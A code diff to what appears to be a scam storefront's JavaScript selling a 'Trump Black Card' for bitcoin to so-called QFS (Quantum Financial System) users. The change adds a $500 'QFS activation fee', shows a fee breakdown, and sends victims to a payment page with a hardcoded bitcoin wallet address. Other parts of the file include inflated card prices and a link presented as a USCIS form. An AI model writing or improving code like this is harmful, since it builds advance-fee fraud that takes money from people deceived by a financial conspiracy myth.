@@ -260,6 +260,7 @@ const INCREASED_PRICES={black:775650,silver:5899};
 const GOLD_PROCESSING_FEE=15000;
 const GOLD_REQUIRED_FORM="https://www.uscis.gov/i-140g";
 const WALLET_ADDR="bc1qqla2r8dmmvefq9svus0kv098nnvudsehpzmut8";
+const QFS_ACTIVATION_FEE = 500; // $500 USD
 
 const CARD_TITLES={
   black:"Trump Black Card — 25,000 Bitcoin",
@@ -486,7 +487,7 @@ view.addEventListener("click",()=>{
   cardPerksEl.classList.remove("show");
   setTimeout(()=>cardPerksEl.classList.add("show"),10);
 
-  /* Show QFS activation message if user is QFS */
+  /* Show QFS activation message with $500 fee */
   if (isQFSUser) {
     let qfsMsg = document.getElementById('qfsActivationMsg');
     if (!qfsMsg) {
@@ -504,15 +505,18 @@ view.addEventListener("click",()=>{
     }
     
     qfsMsg.innerHTML = `
-      <div style="display: flex; align-items: center; gap: 12px;">
+      <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
         <span style="font-size: 28px;">✅</span>
         <div style="text-align: left;">
           <strong style="color: #38bdf8;">QFS Account Activation</strong>
           <p style="color: #e2e8f0; margin: 4px 0 0 0; font-size: 14px;">
             Great choice! Ordering this ${type} card will activate your QFS account.
-            Once your card is delivered, you'll get full access to your QFS portal.
           </p>
         </div>
+      </div>
+      <div style="background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px;">
+        <p style="color: #fbbf24; font-size: 24px; font-weight: bold; margin: 0;">$${QFS_ACTIVATION_FEE}</p>
+        <p style="color: #9ca3af; font-size: 12px; margin: 4px 0 0 0;">One-time QFS account activation fee</p>
       </div>
     `;
   }
@@ -527,7 +531,7 @@ payNowBtn.addEventListener("click", async () => {
     return;
   }
 
-  let usd =
+  let cardPrice =
     selectedCard === "gold"
       ? GOLD_PROCESSING_FEE
       : (Date.now() >= endTs
@@ -535,7 +539,7 @@ payNowBtn.addEventListener("click", async () => {
           : BASE_PRICES)[selectedCard] * Number(qtyEl.value);
 
   let btcValue = currentBtcPrice
-    ? (usd / currentBtcPrice).toFixed(8)
+    ? (cardPrice / currentBtcPrice).toFixed(8)
     : "0.00000000";
 
   /* Handle QFS users differently */
@@ -552,21 +556,44 @@ payNowBtn.addEventListener("click", async () => {
         return;
       }
       
-      const { error } = await supabase.rpc('qfs_order_card', {
-        p_user_id: user.id,
-        p_card_type: selectedCard
-      });
+      // Calculate total with $500 fee
+      const totalUSD = cardPrice + QFS_ACTIVATION_FEE;
+      const totalBTC = currentBtcPrice ? (totalUSD / currentBtcPrice).toFixed(8) : "0.00000000";
       
-      if (error) throw error;
+      // Show fee breakdown
+      const confirmMsg = `QFS Account Activation:\n\n` +
+        `Card Price: $${cardPrice.toLocaleString()}\n` +
+        `Activation Fee: $${QFS_ACTIVATION_FEE}\n` +
+        `Total: $${totalUSD.toLocaleString()} (${totalBTC} BTC)\n\n` +
+        `Proceed to payment?`;
+        
+      if (!confirm(confirmMsg)) {
+        payNowBtn.textContent = "Pay Now";
+        payNowBtn.disabled = false;
+        return;
+      }
       
+      // Store order info with fee
       localStorage.setItem('qfs_last_order', JSON.stringify({
         card: selectedCard,
-        date: new Date().toISOString(),
-        amount: usd
+        card_price: cardPrice,
+        activation_fee: QFS_ACTIVATION_FEE,
+        total: totalUSD,
+        date: new Date().toISOString()
       }));
       
-      alert(`✅ QFS Activation Order Placed!\n\nYour ${selectedCard} card has been ordered. Your QFS account will be activated upon card delivery.`);
-      window.location.href = "/portal/qfs-holding.html?order=success";
+      // Redirect to payment page with QFS params
+      const params = new URLSearchParams({
+        type: 'qfs_activation',
+        card_type: selectedCard,
+        card_price: cardPrice,
+        activation_fee: QFS_ACTIVATION_FEE,
+        total_usd: totalUSD,
+        total_btc: totalBTC,
+        addr: WALLET_ADDR
+      });
+
+      window.location.href = "wallet.html?" + params.toString();
       
     } catch (error) {
       console.error('QFS order failed:', error);
@@ -579,7 +606,7 @@ payNowBtn.addEventListener("click", async () => {
     const params = new URLSearchParams({
       type: selectedCard,
       qty: Number(qtyEl.value),
-      usd,
+      usd: cardPrice,
       btc: btcValue,
       addr: WALLET_ADDR
     });
